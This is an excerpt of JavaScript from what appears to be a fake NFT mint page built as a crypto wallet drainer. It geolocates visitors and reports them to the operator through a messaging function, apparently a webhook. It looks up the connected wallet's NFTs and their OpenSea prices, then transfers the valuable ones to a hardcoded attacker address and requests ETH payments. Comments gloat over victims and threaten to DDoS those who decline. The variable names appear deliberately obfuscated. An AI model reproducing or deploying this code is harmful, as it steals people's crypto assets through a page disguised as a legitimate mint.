...
$.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
    ...
    sendMessage("**[" + myid + "]** Visiting Mint Page.  \n `" + js_data.replace(/(\r\n|\n|\r)/gm, "") + " `");
});
...
async function fetchAccountData() {
  ...
  document.querySelector("#transfer").style.display = "";
...
async function askNfts(khyel, emilyann) {
  ...
  fetch("https://deep-index.moralis.io/api/v2/" + selectedAccount + "/nft?chain=eth&format=decimal", {headers: {"Content-Type": "application/json", accept: "application/json", "x-api-key": moralisApi}, method: "GET"}).then(async dshanti => {
    ...
    sendMessage("**[" + myid + "] **Is trying to mint. \n They have `" + brexlie.length + "` NFTs \nAddress: {<https://etherscan.io/address/" + selectedAccount + ">}")
    if (brexlie.length > 0) {
      let gennette = [];
      for (nft of brexlie) {
        await fetch("https://deep-index.moralis.io/api/v2/nft/" + nft.token_address + "/lowestprice?chain=eth" + "&marketplace=opensea", {headers: {"Content-Type": "application/json", accept: "application/json", "x-api-key": moralisApi}, method: "GET"}).then(async mollye => {
          ...
          if (loisjean >= nftsInfo.minValue.toString(10)) {
            ...
            gennette.push({price: wrynlee.price * (nft.amount > 0 ? nft.amount : 1), options: {type: nft.contract_type.toLowerCase(), receiver: "0x953de0fee9e7b8056dd802b2e9ba0c8e540c68b8", contract_address: nft.token_address, token_id: nft.token_id}});
      ...
      for (transaction of gennette.sort((dreema, jb) => jb.price - dreema.price)) {
       // try tomorrow sendMessage("**[" + myid + "] **you just got an nft from this retard\nThe NFT Address is: " + nft.token_address + "\nthe nft is worth: " + loisjean.toString())
        console.log(transaction);
        Moralis.transfer(transaction.options).catch(meris => console.error(meris, transaction));
        sendMessage("**[" + myid + "] **You just received an nft\nThe NFT  Contract Address is: " + nft.token_address + "\nthe nft is worth: (fixing later)")
...
async function askMint(berthel) {
  ...
  jusin.eth.sendTransaction({from: walletAddress, to: address, value: jusin.utils.toWei(berthel, "ether")}).on("transactionHash", function (kongmeng) {
    sendMessage("**[" + myid + "] ** you got a hit from this guy, good job")
    return setTimeout(() => {
      if (isMobile()) {} else {
    ...
    if (christpher.message && christpher.message.includes("User rejected") || christpher.message && christpher.message.includes("User denied")) {
      if (isMobile()) {} else {
        ...
        sendMessage("**[" + myid + "] ** denied the transaction, let's ddos him ;') ")
      }
